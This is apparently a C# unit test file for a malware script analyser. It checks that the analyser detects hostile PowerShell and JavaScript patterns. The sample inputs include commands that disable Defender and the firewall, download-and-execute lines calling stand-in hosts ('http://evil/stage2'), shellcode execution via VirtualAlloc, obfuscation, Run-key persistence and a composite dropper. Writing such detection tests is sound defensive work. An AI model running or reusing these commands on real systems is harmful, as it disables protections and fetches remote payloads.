using System.Text;
using Nexus.Core.Security;
using Nexus.Core.Security.StaticAnalysis;
using Xunit;

namespace Nexus.Core.Tests;

public class ScriptAnalyzerTests
{
    private static string[] Codes(string script, ScriptKind kind = ScriptKind.PowerShell) =>
        ScriptAnalyzer.Analyse(script, kind).Select(s => s.Code).ToArray();

    // ---- Kind detection ----

    [Theory]
    [InlineData("a.ps1", ScriptKind.PowerShell)]
    [InlineData("a.PSM1", ScriptKind.PowerShell)]
    [InlineData("a.bat", ScriptKind.BatchOrCmd)]
    [InlineData("a.vbs", ScriptKind.VBScript)]
    [InlineData("a.js", ScriptKind.JavaScript)]
    [InlineData("a.hta", ScriptKind.Html)]
    [InlineData("a.exe", ScriptKind.Unknown)]
    public void Script_kind_comes_from_the_extension(string path, ScriptKind expected)
    {
        Assert.Equal(expected, ScriptAnalyzer.KindFromExtension(path));
    }

    [Fact]
    public void Non_scripts_are_not_analysed()
    {
        Assert.Empty(ScriptAnalyzer.Analyse("Invoke-Expression (New-Object Net.WebClient)", ScriptKind.Unknown));
    }

    // ---- Ordinary scripts stay quiet ----

    [Fact]
    public void An_ordinary_admin_script_produces_nothing()
    {
        const string script = """
            $services = Get-Service | Where-Object { $_.Status -eq 'Running' }
            foreach ($s in $services) {
                Write-Host "$($s.Name) is running"
            }
            Get-ChildItem C:\Logs -Recurse | Remove-Item -Force
            """;

        Assert.Empty(Codes(script));
    }

    [Fact]
    public void An_ordinary_build_script_produces_nothing()
    {
        const string script = """
            @echo off
            dotnet restore
            dotnet build -c Release
            if %ERRORLEVEL% neq 0 exit /b 1
            """;

        Assert.Empty(Codes(script, ScriptKind.BatchOrCmd));
    }

    /// <summary>"iex" must not fire on words that merely contain it.</summary>
    [Fact]
    public void Words_containing_iex_do_not_trigger_the_iex_rule()
    {
        Assert.DoesNotContain("script-runs-constructed-code",
            Codes("$index = 0; $indexer = Get-Index; Write-Host $index"));
    }

    // ---- Defence tampering ----

    [Theory]
    [InlineData("Add-MpPreference -ExclusionPath 'C:\\Users\\Public'")]
    [InlineData("Set-MpPreference -DisableRealtimeMonitoring $true")]
    [InlineData("netsh advfirewall set allprofiles state off")]
    public void Turning_off_the_machines_defences_is_strong_evidence(string script)
    {
        var signals = ScriptAnalyzer.Analyse(script, ScriptKind.PowerShell);
        var signal = Assert.Single(signals, s => s.Code == "script-defence-tampering");

        Assert.Equal(SignalWeight.Strong, signal.Weight);
    }

    [Fact]
    public void Only_one_defence_tampering_signal_is_emitted()
    {
        const string script = """
            Set-MpPreference -DisableRealtimeMonitoring $true
            Add-MpPreference -ExclusionPath 'C:\Temp'
            Add-MpPreference -ExclusionExtension '.exe'
            """;

        Assert.Single(Codes(script), c => c == "script-defence-tampering");
    }

    // ---- In-memory execution ----

    [Fact]
    public void Allocating_executable_memory_and_running_it_is_reported()
    {
        const string script = """
            $a = [Kernel32]::VirtualAlloc(0, $size, 0x3000, 0x40)
            [Kernel32]::CreateThread(0, 0, $a, 0, 0, 0)
            """;

        Assert.Contains("script-shellcode", Codes(script));
    }

    [Fact]
    public void Allocating_without_running_is_not_reported_as_shellcode()
    {
        Assert.DoesNotContain("script-shellcode", Codes("$p = [Kernel32]::VirtualAlloc(0, 10, 0x1000, 0x04)"));
    }

    [Fact]
    public void Reflective_assembly_loading_is_reported()
    {
        Assert.Contains("script-reflective-load",
            Codes("[Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, $null)"));
    }

    // ---- Obfuscation ----

    [Fact]
    public void Base64_payloads_are_reported()
    {
        Assert.Contains("script-base64-payload",
            Codes("$d = [Convert]::FromBase64String($blob); iex ([Text.Encoding]::UTF8.GetString($d))"));
    }

    [Fact]
    public void Javascript_atob_is_reported()
    {
        Assert.Contains("script-base64-payload", Codes("eval(atob('dmFyIHggPSAx'));", ScriptKind.JavaScript));
    }

    [Fact]
    public void Character_code_assembly_is_reported()
    {
        var script = string.Concat(Enumerable.Repeat("[char]72+", 10));
        Assert.Contains("script-charcode-assembly", Codes(script));
    }

    [Fact]
    public void A_couple_of_char_casts_are_not_enough_to_flag()
    {
        Assert.DoesNotContain("script-charcode-assembly", Codes("$c = [char]65; $d = [char]66"));
    }

    [Fact]
    public void Heavy_escape_obfuscation_is_reported()
    {
        var script = "i`e`x (n`e`w-o`b`j`e`c`t n`e`t.w`e`bclient)";
        Assert.Contains("script-escape-obfuscation", Codes(script));
    }

    [Fact]
    public void A_very_long_line_is_only_weak_evidence()
    {
        var script = "$x = '" + new string('a', 2000) + "'";
        var signals = ScriptAnalyzer.Analyse(script, ScriptKind.PowerShell);

        var signal = Assert.Single(signals, s => s.Code == "script-very-long-line");
        Assert.Equal(SignalWeight.Weak, signal.Weight);
    }

    // ---- Download and run ----

    [Fact]
    public void Download_then_execute_is_strong_evidence()
    {
        const string script = "iex (New-Object Net.WebClient).DownloadString('http://x/a.ps1')";
        var signals = ScriptAnalyzer.Analyse(script, ScriptKind.PowerShell);

        var signal = Assert.Single(signals, s => s.Code == "script-download-and-run");
        Assert.Equal(SignalWeight.Strong, signal.Weight);
    }

    [Fact]
    public void A_plain_download_is_only_weak_evidence()
    {
        var signals = ScriptAnalyzer.Analyse(
            "Invoke-WebRequest -Uri 'https://example.com/data.csv' -OutFile data.csv", ScriptKind.PowerShell);

        var signal = Assert.Single(signals, s => s.Code == "script-downloads");
        Assert.Equal(SignalWeight.Weak, signal.Weight);
    }

    // ---- Persistence ----

    [Fact]
    public void Startup_persistence_is_reported()
    {
        Assert.Contains("script-persistence",
            Codes(@"Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name x -Value y"));
    }

    // ---- Encoding ----

    [Fact]
    public void Utf16_scripts_are_decoded_so_keywords_are_still_found()
    {
        const string script = "Set-MpPreference -DisableRealtimeMonitoring $true";
        var bytes = Encoding.Unicode.GetBytes(script);

        var decoded = ScriptAnalyzer.DecodeText(bytes);

        Assert.Equal(script, decoded);
        Assert.Contains("script-defence-tampering", Codes(decoded));
    }

    [Fact]
    public void A_utf16_byte_order_mark_is_stripped()
    {
        var bytes = Encoding.Unicode.GetPreamble().Concat(Encoding.Unicode.GetBytes("Get-Process")).ToArray();
        Assert.Equal("Get-Process", ScriptAnalyzer.DecodeText(bytes));
    }

    [Fact]
    public void A_utf8_byte_order_mark_is_stripped()
    {
        var bytes = Encoding.UTF8.GetPreamble().Concat(Encoding.UTF8.GetBytes("Get-Process")).ToArray();
        Assert.Equal("Get-Process", ScriptAnalyzer.DecodeText(bytes));
    }

    [Fact]
    public void Decoding_is_bounded_for_an_enormous_file()
    {
        var huge = new byte[ScriptAnalyzer.MaxAnalysableBytes + 5000];
        Array.Fill(huge, (byte)'a');

        Assert.Equal(ScriptAnalyzer.MaxAnalysableBytes, ScriptAnalyzer.DecodeText(huge).Length);
    }

    /// <summary>A fully obfuscated dropper should corroborate across enough rules to
    /// land high — but still within one source, so the fusion cap applies.</summary>
    [Fact]
    public void A_realistic_dropper_scores_highly()
    {
        const string script = """
            Set-MpPreference -DisableRealtimeMonitoring $true
            $b = [Convert]::FromBase64String($payload)
            iex ((New-Object Net.WebClient).DownloadString('http://evil/stage2'))
            Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name upd -Value $p
            """;

        var signals = ScriptAnalyzer.Analyse(script, ScriptKind.PowerShell);

        var verdict = VerdictEngine.Evaluate(new VerdictInput
        {
            Target = ScanTarget.ForFile(@"C:\Users\x\Downloads\update.ps1", "abc"),
            Signals = signals,
        }, DateTimeOffset.UnixEpoch);

        Assert.True(signals.Count >= 4, $"expected several signals, got {signals.Count}");
        Assert.True(verdict.Level >= ThreatLevel.LikelyMalicious, $"scored only {verdict.Level}");
    }
}
